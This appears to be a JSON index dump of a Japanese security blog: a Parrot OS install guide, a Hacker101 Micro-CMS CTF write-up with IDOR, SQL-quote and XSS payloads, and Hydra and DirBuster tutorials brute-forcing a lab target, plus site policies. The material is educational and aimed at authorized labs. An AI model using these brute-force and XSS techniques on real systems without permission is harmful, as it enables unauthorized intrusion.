LiveCDが起動します。十字キーを使ってinstallを選択します。\nGUIでインストールを行いたいため、そちらを選択します。\nここからはマウスが使えるので簡単だと思います。\n日本語を選択しましょう。\n警告が出ますが、日本語の翻訳が追いついてなくて英語になる可能性あるよってだけです。\nはいを選択していいでしょう。\n住んでいる地域を選択します。\nキーボードの設定です。\n自分はUSキーなので米国を選択しますが、日本語も選択できます。\nrootのパスワードの設定画面が開きます。\nユーザの設定です。\nこちらはスペースや大文字が入っても大丈夫です。\nアカウントのユーザ名です。\nこれをもとにディレクトリが作成されるため、半角英数字で設定してあげます。\nパスワードの設定です。\n短すぎると警告を受けた気がするので、長い方がいいです。\nディスクのパーティショニングです。\nディスク全体を使うを選択します。\nこちらで、ディスクがVBoxのものであるか、自分が設定したディスクサイズに近いかどうかを確認してください。\n確認が済んだら続けるでOKです。\nすべてのファイルを１つのパーティションにを選択します。\nスワップスペースについての警告ですが、8Gもメモリ積んでればスワップはいらないので無視します。\nいいえで大丈夫です。\nディスクをこれで作っていいか確認が来るので、はいを選択します。\nディスクにインストールしています。\nコーヒーでも飲んで待ちましょう。\nブートローダーの設定が出てきました。\nOSをブートする際に必要なのではいを選択します。\nVBOXのハードディスクを選択し、続けるで大丈夫です。\nインストールが完了しました。\n続けるを押してください。\nしばらく待っていると、再起動が始まりログイン画面が出てきました。\nお疲れ様でした。VirtualBoxにインストールが完了しています。\nパッケージアップグレード Parrot Security OSではパッケージのアップデートにラッパーコマンドがあります。\n端末を開いて以下のコマンドを実行するだけで自動的にパッケージの更新をしてくれます。\n1  sudo parrot-upgrade   ログインした際に毎回確認をして、最新の状態を保つようにしてください。\nまとめ セキュリティ機能に特化したParrot Security OSをVirtualBoxにインストールする手順をまとめました。\n今回vmwareを選択しなかった理由としては、VirtualBoxではスナップショットを取ることができるため、もしマルウェアなどに感染してしまった場合などに過去の状態にすぐに戻ることができるからです。\nCTFや脆弱性診断をする際に、Parrot Security OS 使ってみてください。\n","description":"","id":16,"section":"posts","tags":["bugbounty","linux","setup"],"title":"セキュリティに特化したParrot Security OSをVirtualBoxにインストールするまで","uri":"https://blog.yuk1h1ra.me/posts/2020/09/install-parrot-security-os/"},{"content":"注意 CTFの解法が以下に載っています。自力で解きたい方は解法を見る前にブラウザバックしてください。\n概要 Micro-CMS v1ではMarkdown形式で記述されたものを作成、編集、閲覧などができるサービスでした。\n最初にTesting, Markdown Testというページがありそれらの編集などもできるようなサービスでした。\nFlag0 Create a new pageから試しにページを作成してみると、作成されたページのindexが11であることに気が付きます。\nTesting, Markdown Testは1,2と連番だったのにいきなり11になるのはおかしいと感じ、3~10までindex番号を変更して見てみると、indexが\u0026quot;6\u0026quot;のときだけ403 Forbidden Errorが出ました。\n直接参照する際には権限周りで怒られていましたが、editページに飛んで見ると見事Flagを回収することができました。\nFlag1 Flag1では、編集ページの入力値の改ざんを行うことでFlagを回収することができました。\n入力値はFormの値だけではなく、URLのパスからも意図しない入力値が送られることがあります。\neditページでは数字が入力されるのを期待していましたが、数値以外のもの、シングルクオート(')を与えてあげることでFlagを取得することができました。\nFlag2 みんな大好きXSSです。\n入力を表示させるようなページがある場合はみんな試すと思いますので脳死で\u0026lt;scirpt\u0026gt;alert('XSS');\u0026lt;/scirpt\u0026gt;を入力しましょう。\nしかしXSSが表示されるところは詳細ページでは起こりません。\n入力されたものが影響を与えるのは詳細ページだけではありません。\n今回はTitleにXSSのスクリプトタグを入力してみましょう。\nそして、Homeに戻ってみると、無事Flagが回収することができました。\nFlag3 XSSはscriptタグで囲まれた場所以外にも発生します。\n今回はbuttonからクリックした際にXSSが発生するようにしました。\nWebページによっては\u0026quot;script\u0026quot;という文字列を置換してスクリプトを実行させないようにするようなサイトもありますが、onclickを用いることでscirptという文字列を使用せずにXSSを発生させることができます。\nこちらも無事Flagを回収することができました。\nまとめ 比較的基本に忠実な問題ばかりでした。\nCTF初学者や始めてみたい人にとってWriteUPを見ながらでもいいので解いてみて解き方の感覚を掴むのにもってこいの問題だと思います。\n","description":"","id":17,"section":"posts","tags":["writeup","hacker101","ctf"],"title":"【Hacker101】Micro-CMS V1を解いてみた【WriteUP】","uri":"https://blog.yuk1h1ra.me/posts/2020/06/micro-cms-v1/"},{"content":"hydraとは Hydraはリモート認証サービスをブルートフォースクラッキングをする際によく用いられているツールになります。ftp,http,https,smbなど様々なプロトコルをサポートしています。\nHydraでは並列処理することにより高速にパスワードクラッキングを行うことができます。\n使い方 コマンドラインでの使用法は次のとおりです。\n1  hydra [some command line options] [-s PORT] TARGET PROTOCOL [MODULE-OPTIONS]   コマンドラインオプションなどを使用してパスワードやユーザ名などを指定することができます。\nコマンドラインオプションには、以下のようなものを指定することができます。\n1 2 3 4 5  Options: (省略) -l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE -p PASS or -P FILE try password PASS, or load several passwords from FILE (省略)   これらのコマンドラインオプションを使用して、思考するログインユーザ、パスワード、SSLの有無、攻撃に使用する並列タスク数などを指定することができます。\nPROTOCOLは、攻撃にしようするプロトコルです。ftp,smtp,http-getなど様々なものを指定することができます。\nまた、サポートされているプロトコルにも様々なものがあり、プロトコル毎に特別なオプションがあります。\nプロトコル毎の詳しいオプションを確認するには、以下のコマンドのように使用します。\n1 2 3 4 5 6  $ hydra -U http-post-form (省略) Examples: \u0026#34;/login.php:user=^USER^\u0026amp;pass=^PASS^:incorrect\u0026#34; \u0026#34;/login.php:user=^USER64^\u0026amp;pass=^PASS64^\u0026amp;colon=colon\\:escape:S=authlog=.*success\u0026#34; (省略)   実験 今回はHacker101のPetshop Proを対象にしていきます。\nPetshop Proのログイン画面は以下の様になっています。\nここで適当なadmin:adminなどでログイン試行した結果がこちらです。\nInvalid usernameという文字列が表示されました。こちらが今回正しくログインできなかったときの識別として用います。\nhydraでhttp-post-formを用いてusernameの総当りをしていきます。\nusernameの総当りをしていくにあたり適当なwordlistを指定してあげます。\n無事usernameがdulceのときInvalid usernameが表示されないことがわかりました。\nブラウザでdelce:adminでログイン試行してみると\nとなり、passwordが異なることがわかりました。\n続いて、パスワードも同様に総当りで試行していきます。\n無事パスワードもわかったのでログインしてみます。\nフラグが表示され、ログイン完了したことがわかります。\nまとめ Hydraを用いることでログインの総当りをすることができることがわかりました。\nしかし、今回用いられたusername:passwordがwordlistになければいたずらに時間が使われることもわかります。\nまた、hydraは許可された環境下でのみ使用をしてください。\n","description":"","id":18,"section":"posts","tags":["tools","bugbounty","how-to"],"title":"ログインクラッカー「Hydra」の使い方","uri":"https://blog.yuk1h1ra.me/posts/2020/05/how-to-use-hydra/"},{"content":"DirBusterとは DirBusterは、Web/アプリケーションサーバー上のディレクトリとファイル名を総当りで検索するアプリケーションです。Webアプリケーションにはリンクから辿れない数多くのページやアプリケーションが隠されています。DirBusterはこれらを総当りで見つけるためのツールです。\nDirBusterの簡単な使い方を次に紹介します。\nStep1 DirBusterの起動 Parrot Security OSではデフォルトでインストールされているため、そちらを起動します。\nStep2 URLを指定 対象のWebアプリケーションのURLを指定してあげます。\n今回は、Hacker101のPetshopProを対象にしていきます。\n今回対象のWebアプリケーションはhttp://35.227.24.107/02dcccde7d/となるため、それを入力します。\nStep3 リストの選択 Scanする際に単純なBruteForceも可能ですが、あらかじめ用意されたリストを使用してそのリストをぶん回していく方法があります。今回はそのリストを使用します。\nDirBusterには /usr/share/dirbuster/wordlists/ の中にいくつかのリストがあるためそちらを使用します\nStep4 実行 準備ができたらStartを押して実行します。\n設定の際にFile extensionやUse Blank ExtensionにチェックをいれることでScanする対象を選択することができます。\n今回は時間の短縮のためScanの必要のないディレクトリは停止させたりしています。\nStep５ 結果 タブのResultに今までのスキャン結果が出ています。\n今回のWebアプリケーションでは管理画面であるloginページは通常ではたどり着くことができませんでしたが、DirBusterを用いてスキャンすることで見事見つけることができました。\n総括 DirBusterを用いれば秘匿されたWebアプリケーションのディレクトリやファイルの検索を行うことができます。\nしかし、BruteForceでの検索となるため、目的のファイルやディレクトリを発見するのに時間がかかることがわかります。\nまたサービスに多量のリクエストが送られるため、許可された環境下でのみ使用してください。\n","description":"","id":19,"section":"posts","tags":["bugbounty","tools","how-to"],"title":"Webアプリ上のディレクトリ/ファイル名を総当りで検索する「DirBuster」の紹介","uri":"https://blog.yuk1h1ra.me/posts/2020/05/dirbuster/"},{"content":"個人情報の管理 当サイトは、取得した個人情報を、お問い合わせいただいた内容についての確認・相談、情報提供のための返信の目的以外には使用しません。また知り得た個人情報を第三者に開示することは、警察・裁判所など公的機関からの書面を持った請求以外に一切利用いたしません。\n当サイトが使用しているアクセス解析ツールについて 当サイトでは、Googleによるアクセス解析ツールの『Googleアナリティクス』を利用しています。\nGoogleアナリティクスはトラフィックデータの収集のためにCookieを使用しています。\nトラフィックデータは匿名で収集されており、個人を特定するものではありません。\nこの機能はCookieを無効にすることで収集を拒否することができますので、お使いのブラウザの設定をご確認ください。\nこの規約に関して、詳しくはGoogleアナリティクス利用規約をご確認ください。\n制定日・改定日  制定日: 2020年11月04日  ","description":"","id":20,"section":"","tags":null,"title":"プライバシーポリシー","uri":"https://blog.yuk1h1ra.me/privacy-policy/"},{"content":"免責事項 当サイトに掲載されている情報は、万全を期して調べたものではありますが、その内容の正確性や安全性を保証するものではありません。\n万が一、当サイトの情報のご利用等により、何らかの不都合や損失が発生したとしても、当サイトでは一切の責任は負いかねます。\nまた、当サイトに記載した情報は、予告なく、変更や削除される可能性があります。\n不正アクセス禁止法 当サイトでは、様々な情報セキュリティについて記載されていますが、バグバウンティハンター、脆弱性診断士、レッドチーム、セキュリティを学ぶ学生、およびその他のセキュリティの専門家に向けて作成しており、不正アクセス行為を助長するものではありません。\n不正アクセス行為及びそれに準ずる行為は、不正アクセス禁止法により禁止されています。違反者は3年以下の懲役または100万円以下の罰金に処せられます。当サイトの情報を元に、不正アクセス行為またそれに準ずる行為は絶対に行わないでください。\n制定日・改定日  制定日: 2020年11月04日  ","description":"","id":21,"section":"","tags":null,"title":"免責事項","uri":"https://blog.yuk1h1ra.me/disclaimer/"}]